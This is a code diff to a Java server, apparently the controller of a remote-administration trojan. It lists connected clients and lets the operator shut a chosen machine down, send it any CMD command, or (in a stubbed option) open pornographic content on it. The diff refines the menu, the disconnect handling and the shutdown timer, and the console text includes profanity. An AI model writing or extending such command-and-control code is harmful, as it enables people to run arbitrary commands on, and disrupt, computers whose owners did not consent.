@@ -52,13 +52,16 @@ public class Servidor extends Thread {
                     try {
                         String msgg = gambi.readLine();
                         if (msgg == null) {
-                            System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
+                            //System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
                             clientsNames.remove(bufferedWriter);
                             clients.remove(bufferedWriter);
                             break;
                         }
                     } catch (IOException e) {
-                        e.printStackTrace();
+                        //System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
+                        clientsNames.remove(bufferedWriter);
+                        clients.remove(bufferedWriter);
+                        break;
                     }
                 }
             }).start();
@@ -80,12 +83,10 @@ public class Servidor extends Thread {
         }
     }
 
-    private static void sendMsgToClient(BufferedWriter bf, String message) {
-        try {
+    private static void sendMsgToClient(BufferedWriter bf, String message) throws IOException {
+        if (clients.contains(bf)) {
             bf.write(message + "\r\n");
             bf.flush();
-        } catch (IOException e) {
-            e.printStackTrace();
         }
     }
 
@@ -156,29 +157,42 @@ public class Servidor extends Thread {
                         System.out.println("0 - TURN OFF COMPUTER");
                         System.out.println("1 - OPEN PORNOZAO");
                         System.out.println("2 - CMD COMMAND");
+                        System.out.println("3 - VOLTAR");
 
                         System.out.print(">. ");
                         optionSelected = reader.nextInt();
 
-                        if (optionSelected > 2 || optionSelected < 0) {
+                        if (optionSelected > 3 || optionSelected < 0) {
                             System.out.println("Select a valid option fuck!");
                         }
 
-                    } while (optionSelected > 2 || optionSelected < 0);
+                    } while (optionSelected > 3 || optionSelected < 0);
 
+                    if (optionSelected == 3) continue;
+
+                    String msg = "";
                     if (optionSelected == 0) {
 
                         System.out.println("SHUTDOWN TIME (SECONDS): ");
                         long time = reader.nextLong();
-                        sendMsgToClient(clients.get(clientSelected), "shutdown -s -t " + (time <= 0 ? 30000 : time * 1000));
+                        msg = "shutdown -s -t " + (time <= 0 ? 30000 : time);
 
                     } else if (optionSelected == 1) {
 
                     } else if (optionSelected == 2) {
                         String command = reader.nextLine();
-                        sendMsgToClient(clients.get(clientSelected), command == null ? "" : command);
+                        msg = command == null ? "" : command;
                     }
-                    System.out.println("Command send!");
+
+                    try {
+                        sendMsgToClient(clients.get(clientSelected), msg);
+                        System.out.println("Command send!");
+                    }catch (Exception ignored){
+                        System.out.println("User disconnected: " + clientsNames.get(clients.get(clientSelected)));
+                        clientsNames.remove(clients.get(clientSelected));
+                        clients.remove(clients.get(clientSelected));
+                    }
+
                 } while (true);
             } else {
                 System.out.println("No connected users!");
